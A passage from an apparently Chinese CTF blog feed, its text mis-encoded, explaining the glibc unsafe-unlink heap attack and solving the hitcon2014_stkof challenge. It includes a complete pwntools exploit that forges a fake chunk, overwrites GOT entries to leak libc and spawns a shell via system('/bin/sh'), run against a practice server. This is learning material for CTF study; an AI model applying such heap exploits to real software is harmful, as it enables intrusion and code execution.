id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><ol><li><p>ä¼ªé€ fake_chunkï¼šfakechunk-&gt;size=chunk0-0x10ï¼Œå¯ä»¥ç»•è¿‡sizeæ£€æŸ¥</p><p>fakechunk-&gt;fd=&amp;G_ptr-0x18ï¼Œfakechunk-&gt;bk = &amp;G_ptr-&gt;0x10ï¼Œç»•è¿‡fdå’Œbkæ£€æŸ¥</p></li><li><p>ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_size=chunksize-0x10ã€‚å› ä¸ºfakechunkæ¯”chunk0å°0x10</p></li><li><p>ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„inuseä½</p></li><li><p>freeä¸‹ä¸€ä¸ªå †å—chunk1ã€‚fake chunkå’Œchunk1åˆå¹¶ï¼Œfake chunkå‘ç”Ÿunlinkï¼Œä¿®æ”¹äº†G_ptrçš„å€¼</p></li></ol><h4 id="æ•ˆæœ-1"><a href="#æ•ˆæœ-1" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p>ä¿®æ”¹G_ptr=&amp;G_ptr-0x18ã€‚å¦‚æœèƒ½å¤Ÿå¯¹G_ptræŒ‡å‘çš„ç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä»»æ„åœ°å€è¯»å†™</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¾‹é¢˜hitcon2014-stkof"><a href="#ä¾‹é¢˜hitcon2014-stkof" class="headerlink" title="ä¾‹é¢˜hitcon2014_stkof"></a>ä¾‹é¢˜hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png" alt="image-20210831204845498"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€äº†NXã€Canary</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png" alt="image-20210831211106261"></p><p>è¿›å…¥IDAï¼Œé¢ï¼Œæœ‰ä¸ªé€‰é¡¹ä¸º4çš„åŠŸèƒ½ä¼¼ä¹å¹¶æ²¡æœ‰ä½œç”¨ï¼Œç„¶åæº¢å‡ºç‚¹å­˜åœ¨ä¸ä¿®æ”¹å‡½æ•°ä¸­ï¼Œå¯¹äºæˆ‘ä»¬èƒ½ä¿®æ”¹çš„é•¿åº¦æ˜¯ä¸å­˜åœ¨ä»€ä¹ˆé™åˆ¶çš„ï¼Œæ‰€ä»¥èƒ½å¾ˆè½»æ˜“çš„é€ æˆå †æº¢å‡º</p><p>é¢˜ç›®æ²¡å¼€PIEï¼Œæ‰€ä»¥å †ç»“æ„çš„åœ°å€æ˜¯å·²çŸ¥çš„ï¼Œæ•´ä¸ªç¨‹åºä¸å­˜åœ¨æ‰“å°åŠŸèƒ½ã€‚è¿™è¾¹çš„æ€è·¯æ˜¯ï¼š</p><p>å…ˆé€šè¿‡unlinkæŠŠå †ç»“æ„ä¸Šçš„å †æŒ‡é’ˆæ”¹ä¸ºåœ¨å †ç»“æ„å‰çš„åœ°å€ï¼Œä»è€Œå¯ä»¥æ§åˆ¶å †ç»“æ„ï¼Œè¾¾æˆä»»æ„å†™ï¼›ç„¶åå…ˆä¿®æ”¹ <code>s[1] = free@got</code> åœ°å€ï¼ŒåŒæ—¶ä¿®æ”¹ <code>s[2] = puts@got</code> åœ°å€ï¼›å†ä¸€æ¬¡ç¼–è¾‘ï¼Œå®ç°è¦†å†™free@gotä¸ºputs@plt,ä»è€Œå½“è°ƒç”¨ free å‡½æ•°æ—¶ï¼Œå³å¯ç›´æ¥è°ƒç”¨ puts å‡½æ•°ã€‚è¿™æ ·å°±å¯ä»¥æ³„æ¼å‡½æ•°å†…å®¹ã€‚ç„¶åfree(s[2])ï¼Œç›¸å½“äºæ‰§è¡Œäº†putsï¼ˆputs@gotï¼‰é€šè¿‡putsæ³„éœ²puts@gotçš„å€¼ï¼Œè·å¾—libcåŸºåœ°å€ï¼Œç„¶åå°±å¯ä»¥è·å¾—systemï¼›æœ€åä¿®æ”¹å†æŠŠfree@gotä¿®æ”¹ä¸ºsystemï¼Œå¯¹ç€å†™æœ‰/bin/sh\x00çš„å †å—é‡Šæ”¾</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png" alt="image-20210831213326412"></p><p>é¦–å…ˆï¼Œè¿™è¾¹ç¬¬ä¸€ä¸ªç”³è¯·çš„chunkæ˜¯ä¸èƒ½è¢«ä½¿ç”¨çš„ï¼Œç”±äºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setvbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‰é¢å…ˆåˆ†é…ä¸€ä¸ª chunk æ¥æŠŠç¼“å†²åŒºåˆ†é…å®Œæ¯•ï¼Œä»¥å…å½±å“ä¹‹åçš„æ“ä½œã€‚å…·ä½“çš„çœ‹ctfwikiè¿™é¢˜çš„<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO ç¼“å†²åŒºé—®é¢˜åˆ†æ</a>ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªå †å—ä¸èƒ½ç”¨æ¥åšfakechunk</p><p>æ‰€ä»¥è¿™è¾¹è¿›è¡Œåˆ›é€ fake_chunkè¦æ³¨æ„ï¼é¦–å…ˆï¼Œå †å—çš„ç´¢å¼•ä»1å¼€å§‹ï¼›å…¶æ¬¡ç¬¬ä¸€ä¸ªä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä»å †ç»“æ„çš„ç¬¬äºŒä¸ªåœ°æ–¹ä½œä¸ºåœ°å€</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png" alt="image-20210831214046823"></p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png" alt="image-20210831214232302"></p><p>è§¦å‘unlinkï¼Œé€ æˆåˆå¹¶ï¼ŒåŒæ—¶å †ç»“æ„æŒ‡é’ˆçš„å€¼è¢«æ”¹ä¸ºå…¶åœ°å€ - 0x18</p><p>ç„¶åå°±æ˜¯æŒ‰ç…§æ€è·¯æ‰€è¯´çš„ï¼Œå»ä¿®æ”¹å †ç»“æ„å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 é˜²æ­¢åˆå¹¶</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size  size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ–°ç‰ˆæœ¬ä¸‹çš„unlink"><a href="#æ–°ç‰ˆæœ¬ä¸‹çš„unlink" class="headerlink" title="æ–°ç‰ˆæœ¬ä¸‹çš„unlink"></a>æ–°ç‰ˆæœ¬ä¸‹çš„unlink</h2><p>åœ¨ glibc2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œglibc åœ¨ unlink å†…åŠ å…¥äº† prevsize checkã€‚å½“ç„¶è¿™ä¸ªæ£€æµ‹å¯¹äºä¸Šé¢çš„unlinkæ”»å‡»æ˜¯æ²¡æœ‰å½±å“çš„ï¼Œå½±å“çš„æ˜¯offbynullçš„æ”»å‡»åˆ©ç”¨ï¼Œä¸èƒ½ç›´æ¥é€šè¿‡ä¿®æ”¹sizeæ¥åˆ¶é€ å †å—é‡å ã€‚ä¸‹é¢æ˜¯æ–°çš„æ£€æµ‹æœºåˆ¶æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…·ä½“å…³äºoffbynullå¸¦æ¥çš„å½±å“ï¼Œå¯ä»¥ç§»æ­¥æˆ‘çš„å¦ä¸€ç¯‡åšå®¢offbyone&amp;null</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»¥ä¸‹çŸ¥è¯†æ‘˜è‡ªã€ŠCTFç«èµ›æƒå¨æŒ‡å— Pwnç¯‡ã€‹ã€CTF-Wiki&lt;/p&gt;
&lt;h1 id=&quot;ä¸å®‰å…¨çš„unlike&quot;&gt;&lt;a href=&quot;#ä¸å®‰å…¨çš„unlike&quot; class=&quot;headerlink&quot; title=&quot;ä¸å®‰å…¨çš„unlike&quot;&gt;&lt;/a&gt;ä¸å®‰å…¨çš„unlike&lt;/h1&gt;&lt;h</summary>
      
    
    
    
    
    <category term="unlink" scheme="http://example.com/tags/unlink/"/>
    
  </entry>
  
</feed>
